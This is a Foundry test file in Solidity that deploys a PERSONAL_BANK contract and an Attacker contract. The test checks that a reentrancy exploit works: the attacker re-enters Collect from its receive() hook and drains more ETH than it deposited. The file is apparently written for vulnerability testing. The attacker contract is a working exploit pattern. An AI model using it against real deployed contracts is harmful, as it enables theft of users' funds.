
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PERSONAL_BANK, LogFile} from "../src/PERSONAL_BANK.sol";

contract TestReentrancyPERSONAL_BANK is Test {
    PERSONAL_BANK public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new PERSONAL_BANK();
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.SetMinSum(1 ether);
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= 10 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The attacker needs to deposit first to have a balance >= MinSum

        // --- 3. Funding ---
        // Fund the Victim contract with extra ETH (simulating other users' deposits)
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}

    fallback() external payable {}
}

contract Attacker {
    PERSONAL_BANK public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        victim = PERSONAL_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Deposit funds to establish a balance in the victim contract
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        // Capture Initial State - attacker's ETH balance before the attack
        initialSnapshot = address(this).balance;
        
        // Store the value for the re-entrant call
        storedAttackVal = val;
        
        // Reset call count for the attack
        attackCallCount = 0;

        // Call the vulnerable Collect function
        victim.Collect(val);

        // Verify Success Conditions
        // If we received more ETH than we should have (due to reentrancy), the attack succeeded
        // We deposited 'val' once but should have withdrawn it twice due to reentrancy
        uint256 finalBalance = address(this).balance;
        
        // The attack is successful if:
        // 1. We called Collect at least twice (initial + reentrant)
        // 2. We received more than our initial deposit
        if (attackCallCount >= 2 && finalBalance > initialSnapshot + storedAttackVal) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        
        if (attackCallCount < 2) {
            // Re-enter the Collect function before the balance is updated
            if (address(victim).balance >= storedAttackVal) {
                victim.Collect(storedAttackVal);
            }
        }
    }

    fallback() external payable {}
}
